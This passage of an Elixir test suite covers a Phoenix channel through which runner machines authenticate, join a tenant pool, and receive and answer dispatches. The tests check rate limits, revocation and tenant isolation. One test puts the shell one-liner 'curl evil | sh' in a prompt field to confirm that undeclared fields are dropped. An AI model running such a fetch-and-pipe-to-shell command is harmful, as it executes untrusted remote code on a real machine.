defmodule LoopctlWeb.RunnerChannelTest do
  @moduledoc """
  Issue #801 acceptance: a runner joins with a valid token, appears in the pool, and
  vanishes when its process dies — with no sweeper involved — and an invalid or revoked
  token is refused.

  ## Why `async: false`

  A dispatch, a reply and a trace write the dispatch ledger on the RLS `Loopctl.Repo`, while
  the socket authenticates its runner through `Loopctl.AdminRepo` — separate sandbox
  connections that cannot see each other's uncommitted rows. The `dispatch`,
  `dispatch_reply` and `trace` tests therefore use COMMITTED runners
  (`fixture(:committed_runner)`), swept at module boundaries, which no concurrently running
  test may see.
  """

  use LoopctlWeb.ChannelCase, async: false

  alias Loopctl.ApiSpec.RunnerContract
  alias Loopctl.ApiSpec.RunnerContract.RunnerTraceBatch
  alias Loopctl.ApiSpec.RunnerContract.RunnerTraceEvent
  alias Loopctl.Auth
  alias Loopctl.Runners
  alias Loopctl.Runners.DispatchLedger
  alias Loopctl.Runners.DispatchRecord
  alias Loopctl.Runners.Presence
  alias Loopctl.Tenants
  alias LoopctlWeb.RunnerSocket

  setup :verify_on_exit!

  setup_all do
    sweep_committed_runner_tenants()
    on_exit(&sweep_committed_runner_tenants/0)
    :ok
  end

  # The dispatch, reply and trace tests below each wait on a database transaction in the
  # channel process; the 100ms default is too tight for that under a loaded full suite.
  @reply_timeout 2_000

  defp connect_info(token) do
    %{
      x_headers: [{RunnerSocket.token_header(), token}],
      peer_data: %{address: {127, 0, 0, 1}, port: 40_000, ssl_cert: nil}
    }
  end

  defp join_payload(machine, overrides \\ %{}) do
    Map.merge(
      %{
        "contract_version" => RunnerContract.version(),
        "machine" => machine,
        "cores" => 16,
        "memory_mb" => 28_000,
        "repos" => ["mkreyman/home_care_billing"],
        "max_sessions" => 2,
        "in_flight" => 0,
        "draining" => false
      },
      overrides
    )
  end

  defp connect_runner(token), do: connect(RunnerSocket, %{}, connect_info: connect_info(token))

  # Joins and waits for the channel to process :after_join (the Presence track).
  defp topic(socket), do: "runner:" <> socket.assigns.runner.id

  defp join_pool(socket, machine) do
    {:ok, reply, channel} = subscribe_and_join(socket, topic(socket), join_payload(machine))
    _ = :sys.get_state(channel.channel_pid)
    {reply, channel}
  end

  defp in_pool?(tenant_id, name), do: Map.has_key?(Runners.pool(tenant_id), name)

  describe "connect" do
    test "accepts an enrolled runner's token from the header" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      assert {:ok, socket} = connect_runner(raw)
      assert socket.assigns.runner.id == runner.id
      assert socket.assigns.tenant_id == runner.tenant_id
      assert RunnerSocket.id(socket) == "runner_socket:" <> runner.id
    end

    test "refuses a missing, empty or invalid token" do
      assert :error = connect(RunnerSocket, %{}, connect_info: %{x_headers: []})
      assert :error = connect_runner("")
      assert :error = connect_runner("lc_definitely_not_a_key")
    end

    test "ignores a token passed as a URL parameter" do
      {raw, _runner} = fixture(:runner, %{})
      assert :error = connect(RunnerSocket, %{"token" => raw}, connect_info: %{x_headers: []})
    end

    test "refuses two token headers rather than picking one" do
      {raw, _runner} = fixture(:runner, %{})

      info = %{
        x_headers: [{RunnerSocket.token_header(), raw}, {RunnerSocket.token_header(), "x"}]
      }

      assert :error = connect(RunnerSocket, %{}, connect_info: info)
    end

    test "refuses a valid API key that is not enrolled as a runner" do
      tenant = fixture(:tenant)
      {raw, _key} = fixture(:api_key, %{tenant_id: tenant.id, role: :agent})
      assert :error = connect_runner(raw)
    end

    test "counts the attempt against the per-IP auth bucket BEFORE resolving the token" do
      {raw, _runner} = fixture(:runner, %{})
      test_pid = self()

      Mox.expect(Loopctl.MockRateLimiter, :check_rate, fn bucket, _window, _limit ->
        send(test_pid, {:bucket, bucket})
        {:allow, 1}
      end)

      assert {:ok, _socket} = connect_runner(raw)
      assert_received {:bucket, "auth_ip:127.0.0.1"}
    end

    test "refuses a valid token once the per-IP ceiling is hit, and fails closed on a fault" do
      {raw, _runner} = fixture(:runner, %{})

      Mox.expect(Loopctl.MockRateLimiter, :check_rate, fn _b, _w, limit -> {:deny, limit} end)
      assert :error = connect_runner(raw)

      Mox.expect(Loopctl.MockRateLimiter, :check_rate, fn _b, _w, _l -> {:error, :down} end)
      assert :error = connect_runner(raw)
    end

    test "refuses a revoked runner" do
      {raw, runner} = fixture(:runner, %{})
      {:ok, _} = Runners.revoke_runner(runner.tenant_id, runner.id)
      assert :error = connect_runner(raw)
    end
  end

  describe "join and the pool" do
    test "a joined runner appears in its tenant's pool with its declared meta" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)

      {reply, _channel} = join_pool(socket, "minis")
      assert reply == %{contract_version: RunnerContract.version()}

      assert %{"minis" => %{metas: [meta]}} = Runners.pool(runner.tenant_id)
      assert meta.runner_id == runner.id
      assert meta.cores == 16
      assert meta.max_sessions == 2
      assert meta.repos == ["mkreyman/home_care_billing"]
    end

    test "the runner vanishes from the pool when its process is killed, with no sweeper" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      assert in_pool?(runner.tenant_id, "minis")

      Process.unlink(channel.channel_pid)
      Process.exit(channel.channel_pid, :kill)

      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)
    end

    test "re-reads authorization on every join, so a revoked runner cannot rejoin" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")

      Process.unlink(channel.channel_pid)
      ref = leave(channel)
      assert_reply ref, :ok
      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)

      # Revoked through the api_keys route: no broadcast reaches the unjoined socket.
      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)

      assert {:error, %{reason: "not_authorized"}} =
               subscribe_and_join(socket, topic(socket), join_payload("minis"))

      refute in_pool?(runner.tenant_id, "minis")
    end

    test "refuses a join on another runner's topic" do
      {raw, _runner} = fixture(:runner, %{name: "minis"})
      {_raw_other, other} = fixture(:runner, %{name: "blockit"})
      {:ok, socket} = connect_runner(raw)

      assert {:error, %{reason: "forbidden_topic"}} =
               subscribe_and_join(socket, "runner:" <> other.id, join_payload("blockit"))

      refute in_pool?(other.tenant_id, "blockit")
    end

    test "a refused unauthorized join also disconnects the socket" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      @endpoint.subscribe(RunnerSocket.socket_id(runner.id))

      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)

      assert {:error, %{reason: "not_authorized"}} =
               subscribe_and_join(socket, topic(socket), join_payload("minis"))

      assert_receive %Phoenix.Socket.Broadcast{event: "disconnect"}
    end

    test "joins are budgeted per runner BEFORE the authorization read" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      join_bucket = "runner_join:" <> runner.id

      Mox.stub(Loopctl.MockRateLimiter, :check_rate, fn
        ^join_bucket, _window, limit -> {:deny, limit}
        _bucket, _window, _limit -> {:allow, 1}
      end)

      # Revoked too: if the read ran first, the refusal would say not_authorized.
      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)

      assert {:error, %{reason: "rate_limited"}} =
               subscribe_and_join(socket, topic(socket), join_payload("minis"))
    end

    test "refuses a join under a machine name other than the enrolled one" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)

      assert {:error, %{reason: "machine_mismatch", declared: "mac-mini"}} =
               subscribe_and_join(socket, topic(socket), join_payload("mac-mini"))

      refute in_pool?(runner.tenant_id, "mac-mini")
      refute in_pool?(runner.tenant_id, "minis")
    end

    test "a runner built against contract 1.0.0 still joins the 1.1.0 server" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)

      assert {:ok, %{contract_version: "1.1.0"}, _channel} =
               subscribe_and_join(
                 socket,
                 topic(socket),
                 join_payload("minis", %{"contract_version" => "1.0.0"})
               )

      assert eventually(fn -> in_pool?(runner.tenant_id, "minis") end)
    end

    test "refuses a contract major version the server does not speak" do
      {raw, _runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)

      assert {:error, %{reason: "unsupported_contract_version", sent: "2.0.0"}} =
               subscribe_and_join(
                 socket,
                 topic(socket),
                 join_payload("minis", %{"contract_version" => "2.0.0"})
               )
    end

    test "refuses a payload that does not match the contract" do
      {raw, _runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)

      assert {:error, %{reason: "invalid_payload", details: details}} =
               subscribe_and_join(
                 socket,
                 topic(socket),
                 Map.delete(join_payload("minis"), "cores")
               )

      assert Enum.any?(details, &String.contains?(&1, "cores"))
    end

    test "routes no other topic, and the channel refuses one handed to it anyway" do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      pool_topic = Runners.pool_topic(runner.tenant_id)

      assert_raise RuntimeError, ~r/no channel found/, fn ->
        subscribe_and_join(socket, pool_topic, join_payload("minis"))
      end

      assert {:error, %{reason: "unknown_topic"}} =
               subscribe_and_join(
                 socket,
                 LoopctlWeb.RunnerChannel,
                 pool_topic,
                 join_payload("minis")
               )
    end

    test "a runner is invisible in another tenant's pool" do
      {raw_a, runner_a} = fixture(:runner, %{name: "minis"})
      tenant_b = fixture(:tenant)
      {:ok, socket} = connect_runner(raw_a)
      {_reply, _channel} = join_pool(socket, "minis")

      assert in_pool?(runner_a.tenant_id, "minis")
      assert Runners.pool(tenant_b.id) == %{}
    end

    test "the runner is not sent the pool" do
      {raw, _runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, _channel} = join_pool(socket, "minis")

      refute_push "presence_state", _
      refute_push "presence_diff", _
    end
  end

  describe "status" do
    setup do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      %{runner: runner, channel: channel}
    end

    test "updates the runner's meta in the pool", %{runner: runner, channel: channel} do
      ref = push(channel, "status", %{"in_flight" => 1, "draining" => true})
      assert_reply ref, :ok

      assert %{"minis" => %{metas: [meta]}} =
               eventually(fn ->
                 pool = Runners.pool(runner.tenant_id)
                 match?(%{"minis" => %{metas: [%{in_flight: 1}]}}, pool) && pool
               end)

      assert meta.draining == true
      assert meta.cores == 16
    end

    test "refuses an update inside the minimum interval", %{channel: channel} do
      ref = push(channel, "status", %{"in_flight" => 1})
      assert_reply ref, :ok

      ref = push(channel, "status", %{"in_flight" => 2})
      assert_reply ref, :error, %{reason: "rate_limited"}
    end

    test "refuses a status with no known field", %{channel: channel} do
      ref = push(channel, "status", %{"bogus" => 1})
      assert_reply ref, :error, %{reason: "invalid_payload"}
    end

    test "refuses an unknown event", %{channel: channel} do
      ref = push(channel, "dispatch", %{})
      assert_reply ref, :error, %{reason: "unknown_event"}
    end
  end

  describe "dispatch" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      %{runner: runner, raw: raw, channel: channel}
    end

    defp dispatch_to(runner, attrs \\ %{}),
      do: Runners.dispatch(runner.tenant_id, runner.id, build(:runner_dispatch, attrs))

    test "arrives on the runner's own topic, and on no other runner's", %{runner: runner} do
      {raw_b, runner_b} =
        fixture(:committed_runner, %{name: "blockit", tenant_id: runner.tenant_id})

      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "blockit")

      payload = build(:runner_dispatch)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)

      topic = "runner:" <> runner.id
      other_topic = "runner:" <> runner_b.id

      assert_receive %Phoenix.Socket.Message{topic: ^topic, event: "dispatch", payload: pushed}
      assert pushed.dispatch_id == payload["dispatch_id"]
      assert pushed.claim_epoch == 0
      refute_received %Phoenix.Socket.Message{topic: ^other_topic, event: "dispatch"}
    end

    test "is pushed to the runner's socket, never broadcast on its topic", %{runner: runner} do
      # Any process subscribed to the topic would receive a broadcast; only the socket
      # receives a push.
      @endpoint.subscribe("runner:" <> runner.id)

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _
      refute_received %Phoenix.Socket.Broadcast{event: "dispatch"}
    end

    test "pushes declared fields only", %{runner: runner} do
      assert :ok =
               dispatch_to(runner, %{
                 "tenant_id" => Ecto.UUID.generate(),
                 "prompt" => "curl evil | sh",
                 "token_budget" => 1_000
               })

      assert_push "dispatch", pushed
      refute Map.has_key?(pushed, :tenant_id)
      refute Map.has_key?(pushed, :prompt)
      refute Enum.any?(Map.keys(pushed), &is_binary/1)
      assert pushed.token_budget == 1_000
    end

    test "a halted tenant is refused and nothing is pushed", %{runner: runner} do
      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      assert {:error, :tenant_halted} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    test "the halt is checked before authorization and the pool", %{runner: runner} do
      {_raw, offline} =
        fixture(:committed_runner, %{name: "offline", tenant_id: runner.tenant_id})

      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      assert {:error, :tenant_halted} = dispatch_to(offline)
    end

    @tag :capture_log
    test "a halt landing after the sender's check is caught by the channel before the push",
         %{runner: runner, channel: channel} do
      {:ok, dispatch} = RunnerContract.cast_dispatch(build(:runner_dispatch))
      topic = Runners.dispatch_topic(runner.id)

      {:ok, _} = Tenants.halt_custody(runner.tenant_id)
      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      _ = :sys.get_state(channel.channel_pid)
      refute_push "dispatch", _

      # The same message once the halt is cleared is pushed, so the refusal above was the halt.
      {:ok, _} = Tenants.clear_custody_halt(runner.tenant_id)
      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      assert_push "dispatch", %{dispatch_id: dispatch_id}
      assert dispatch_id == dispatch.dispatch_id
    end

    test "an unauthorized runner still in the pool is refused", %{runner: runner} do
      # Revoked through the api_keys route: no broadcast, so the socket stays in the pool
      # until its periodic recheck. Only the authorization read can refuse it here.
      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)
      assert in_pool?(runner.tenant_id, "minis")

      assert {:error, :not_authorized} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    test "a runner that is not connected is refused", %{runner: runner} do
      {_raw, offline} =
        fixture(:committed_runner, %{name: "offline", tenant_id: runner.tenant_id})

      assert {:error, :runner_not_connected} = dispatch_to(offline)
      refute_push "dispatch", _
    end

    test "a runner whose socket left the pool is refused", %{runner: runner, channel: channel} do
      Process.unlink(channel.channel_pid)
      ref = leave(channel)
      assert_reply ref, :ok
      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)

      assert {:error, :runner_not_connected} = dispatch_to(runner)
    end

    test "a credential live on two sockets is refused", %{runner: runner, raw: raw} do
      {:ok, second} = connect_runner(raw)
      {_reply, _channel} = join_pool(second, "minis")

      assert {:error, :runner_ambiguous} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    @tag :capture_log
    test "a second subscribed socket missing from the pool read gets no push; one push happens",
         %{runner: runner, raw: raw} do
      # The state a socket is in when `dispatch/3`'s pool read cannot see it: subscribed to
      # the runner's dispatches but absent from the pool (not yet tracked, or not yet in this
      # node's Presence view). Produced here by untracking a joined second socket.
      {:ok, second} = connect_runner(raw)
      {_reply, channel_b} = join_pool(second, "minis")
      :ok = Presence.untrack(channel_b.channel_pid, Runners.pool_topic(runner.tenant_id), "minis")
      assert eventually(fn -> length(Runners.live_metas(runner.tenant_id, runner.id)) == 1 end)

      assert :ok = dispatch_to(runner)

      # Both channels receive the broadcast; only the socket that is the pool's sole live
      # meta pushes. Both transports are this test process, so count every push.
      assert_receive %Phoenix.Socket.Message{event: "dispatch"}
      refute_receive %Phoenix.Socket.Message{event: "dispatch"}
    end

    @tag :capture_log
    test "a live meta the sender did not see stops the push", %{runner: runner} do
      {:ok, dispatch} = RunnerContract.cast_dispatch(build(:runner_dispatch))
      topic = Runners.dispatch_topic(runner.id)

      # A second live socket for this runner, as another node's Presence would report it.
      other =
        spawn(fn ->
          receive do
            :stop -> :ok
          end
        end)

      {:ok, _ref} =
        Presence.track(other, Runners.pool_topic(runner.tenant_id), "minis", %{
          runner_id: runner.id
        })

      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      refute_push "dispatch", _

      # Once it is gone the same message is pushed, so the refusal above was the second meta.
      send(other, :stop)
      assert eventually(fn -> length(Runners.live_metas(runner.tenant_id, runner.id)) == 1 end)
      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      assert_push "dispatch", _
    end

    test "still pushes after a status update re-issues the socket's Presence ref",
         %{runner: runner, channel: channel} do
      ref = push(channel, "status", %{"in_flight" => 1})
      assert_reply ref, :ok

      assert eventually(fn ->
               match?([%{in_flight: 1}], Runners.live_metas(runner.tenant_id, runner.id))
             end)

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _
    end

    test "is recorded in the ledger as sent, and a re-send of the same id adds no row",
         %{runner: runner} do
      payload = build(:runner_dispatch, %{"claim_epoch" => 4})

      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      record = DispatchLedger.get_record(runner.tenant_id, payload["dispatch_id"])
      assert %DispatchRecord{status: "sent", claim_epoch: 4} = record
      assert record.runner_id == runner.id

      # The retry of a push the channel may have dropped is sent again, onto the same row.
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout
      assert DispatchLedger.get_record(runner.tenant_id, payload["dispatch_id"]).id == record.id
    end

    test "a dispatch_id whose ledger row disagrees is refused before anything is pushed",
         %{runner: runner} do
      payload = build(:runner_dispatch)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      assert {:error, :dispatch_id_conflict} =
               Runners.dispatch(runner.tenant_id, runner.id, %{payload | "claim_epoch" => 1})

      refute_push "dispatch", _
    end

    test "a dispatch the runner already answered is not pushed again",
         %{runner: runner, channel: channel} do
      payload = build(:runner_dispatch)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      ref = push(channel, "dispatch_reply", accept(payload))
      assert_reply ref, :ok, _, @reply_timeout

      assert {:error, :dispatch_already_replied} =
               Runners.dispatch(runner.tenant_id, runner.id, payload)

      refute_push "dispatch", _
    end

    test "a malformed payload is refused and nothing is pushed", %{runner: runner} do
      assert {:error, {:invalid, details}} =
               Runners.dispatch(
                 runner.tenant_id,
                 runner.id,
                 Map.delete(build(:runner_dispatch), "claim_epoch")
               )

      assert Enum.any?(details, &String.contains?(&1, "claim_epoch"))
      assert {:error, {:invalid, _}} = dispatch_to(runner, %{"kind" => "shell"})
      assert {:error, {:invalid, _}} = Runners.dispatch(runner.tenant_id, runner.id, nil)
      refute_push "dispatch", _
    end

    test "another tenant cannot reach this runner by id", %{runner: runner} do
      tenant_b = fixture(:committed_tenant, %{})
      {raw_b, runner_b} = fixture(:committed_runner, %{name: "minis", tenant_id: tenant_b.id})
      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "minis")

      assert {:error, :not_authorized} =
               Runners.dispatch(tenant_b.id, runner.id, build(:runner_dispatch))

      # Tenant B's own runner, joined under the same machine name, is still reachable by B.
      assert :ok = Runners.dispatch(tenant_b.id, runner_b.id, build(:runner_dispatch))
      topic = "runner:" <> runner.id
      topic_b = "runner:" <> runner_b.id
      assert_receive %Phoenix.Socket.Message{topic: ^topic_b, event: "dispatch"}
      refute_received %Phoenix.Socket.Message{topic: ^topic, event: "dispatch"}
    end

    test "a halt on another tenant does not stop this one", %{runner: runner} do
      tenant_b = fixture(:committed_tenant, %{})
      {:ok, _} = Tenants.halt_custody(tenant_b.id)

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _
    end

    test "malformed ids address no runner", %{runner: runner} do
      assert {:error, :not_authorized} =
               Runners.dispatch("not-a-uuid", runner.id, build(:runner_dispatch))

      assert {:error, :not_authorized} =
               Runners.dispatch(runner.tenant_id, "not-a-uuid", build(:runner_dispatch))
    end
  end

  # The minimum intervals are per channel process; a test that sends several messages in a
  # row resets them rather than sleeping, so the rate-limit tests below are what cover them.
  defp reset_intervals(channel) do
    :sys.replace_state(channel.channel_pid, fn socket ->
      assigns = %{
        socket.assigns
        | last_reply_at: :never,
          last_trace_at: :never,
          last_cursor_at: :never
      }

      %{socket | assigns: assigns}
    end)
  end

  defp pin_interval(channel, key) do
    :sys.replace_state(channel.channel_pid, fn socket ->
      at = System.monotonic_time(:millisecond) + 60_000
      %{socket | assigns: Map.put(socket.assigns, key, at)}
    end)
  end

  defp accept(dispatch, attrs \\ %{}) do
    Map.merge(
      %{
        "dispatch_id" => dispatch["dispatch_id"],
        "claim_epoch" => dispatch["claim_epoch"],
        "decision" => "accepted"
      },
      attrs
    )
  end

  defp status_of(runner, dispatch),
    do: DispatchLedger.get_record(runner.tenant_id, dispatch["dispatch_id"]).status

  describe "dispatch_reply" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = build(:runner_dispatch, %{"claim_epoch" => 2})
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      %{runner: runner, channel: channel, dispatch: dispatch}
    end

    test "accepted is recorded", %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end

    test "refused is recorded with its reason",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref =
        push(
          channel,
          "dispatch_reply",
          accept(dispatch, %{"decision" => "refused", "reason" => "repo_not_allowed"})
        )

      assert_reply ref, :ok, _, @reply_timeout

      assert %DispatchRecord{status: "refused", reason: "repo_not_allowed"} =
               DispatchLedger.get_record(runner.tenant_id, dispatch["dispatch_id"])
    end

    test "an identical repeat is ok; a conflicting one is already_replied",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout

      reset_intervals(channel)
      refusal = accept(dispatch, %{"decision" => "refused", "reason" => "draining"})
      ref = push(channel, "dispatch_reply", refusal)
      assert_reply ref, :error, %{reason: "already_replied"}, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end

    test "a stale claim_epoch is refused",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch, %{"claim_epoch" => 1}))
      assert_reply ref, :error, %{reason: "stale_claim_epoch"}, @reply_timeout
      assert status_of(runner, dispatch) == "sent"
    end

    test "another runner's dispatch is unknown", %{runner: runner, channel: channel} do
      {raw_b, runner_b} =
        fixture(:committed_runner, %{name: "blockit", tenant_id: runner.tenant_id})

      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "blockit")
      theirs = build(:runner_dispatch)
      :ok = Runners.dispatch(runner.tenant_id, runner_b.id, theirs)

      ref = push(channel, "dispatch_reply", accept(theirs))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout
      assert status_of(runner_b, theirs) == "sent"
    end

    test "another tenant's dispatch is unknown", %{channel: channel} do
      tenant_b = fixture(:committed_tenant, %{})
      {raw_b, runner_b} = fixture(:committed_runner, %{name: "minis", tenant_id: tenant_b.id})
      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "minis")
      theirs = build(:runner_dispatch)
      :ok = Runners.dispatch(tenant_b.id, runner_b.id, theirs)

      ref = push(channel, "dispatch_reply", accept(theirs))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout
      assert status_of(runner_b, theirs) == "sent"
    end

    test "an invalid reply is refused", %{channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch, %{"decision" => "refused"}))
      assert_reply ref, :error, %{reason: "invalid_payload"}, @reply_timeout
    end

    test "a reply records its time, and a reply inside the minimum interval is refused",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert is_integer(:sys.get_state(channel.channel_pid).assigns.last_reply_at)

      # Pinned in the future, so the refusal does not depend on how long the first reply took.
      pin_interval(channel, :last_reply_at)

      ref =
        push(
          channel,
          "dispatch_reply",
          accept(dispatch, %{"decision" => "refused", "reason" => "draining"})
        )

      assert_reply ref, :error, %{reason: "rate_limited", min_interval_ms: ms}, @reply_timeout
      assert ms > 0
      assert status_of(runner, dispatch) == "accepted"
    end

    test "a halted tenant can still record a reply and its trace",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"

      batch =
        build(:runner_trace_batch, %{
          :seqs => [0],
          "dispatch_id" => dispatch["dispatch_id"],
          "claim_epoch" => 2
        })

      ref = push(channel, "trace", batch)
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
    end
  end

  describe "trace" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = build(:runner_dispatch)
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      reset_intervals(channel)

      %{runner: runner, channel: channel, dispatch: dispatch, run_id: Ecto.UUID.generate()}
    end

    defp batch(dispatch, run_id, seqs, attrs \\ %{}) do
      build(
        :runner_trace_batch,
        Map.merge(
          %{
            :seqs => seqs,
            "run_id" => run_id,
            "dispatch_id" => dispatch["dispatch_id"],
            "claim_epoch" => dispatch["claim_epoch"]
          },
          attrs
        )
      )
    end

    defp send_trace(channel, payload) do
      reset_intervals(channel)
      push(channel, "trace", payload)
    end

    test "stores a batch once, and acks the contiguous seqs",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 3]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 3]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [2]))
      assert_reply ref, :ok, %{acked_seq: 3}, @reply_timeout
    end

    test "trace_cursor is -1 before anything is stored, then the acked seq",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: -1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 2]))
      assert_reply ref, :ok, %{acked_seq: 2}, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: 2}, @reply_timeout
    end

    test "a batch for an unknown dispatch, or at a wrong epoch, is refused",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      unknown = %{dispatch | "dispatch_id" => Ecto.UUID.generate()}
      ref = send_trace(channel, batch(unknown, run_id, [0]))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0], %{"claim_epoch" => 7}))
      assert_reply ref, :error, %{reason: "stale_claim_epoch"}, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: -1}, @reply_timeout
    end

    test "a second run for the dispatch is refused",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, Ecto.UUID.generate(), [0]))
      assert_reply ref, :error, %{reason: "run_mismatch"}, @reply_timeout
    end

    test "an oversize batch and an oversize event are refused with their limits",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      max_events = RunnerTraceBatch.max_events()
      ref = send_trace(channel, batch(dispatch, run_id, Enum.to_list(0..max_events)))

      assert_reply ref,
                   :error,
                   %{reason: "batch_too_large", max_events: ^max_events},
                   @reply_timeout

      max_bytes = RunnerTraceEvent.max_data_bytes()
      big = %{"k" => String.duplicate("x", max_bytes)}
      oversize = put_in(batch(dispatch, run_id, [0]), ["events", Access.at(0), "data"], big)
      ref = send_trace(channel, oversize)

      assert_reply ref,
                   :error,
                   %{reason: "event_data_too_large", seq: 0, max_data_bytes: ^max_bytes},
                   @reply_timeout
    end

    test "a batch records its time; a batch or cursor inside its OWN minimum interval is refused",
         %{runner: runner, channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
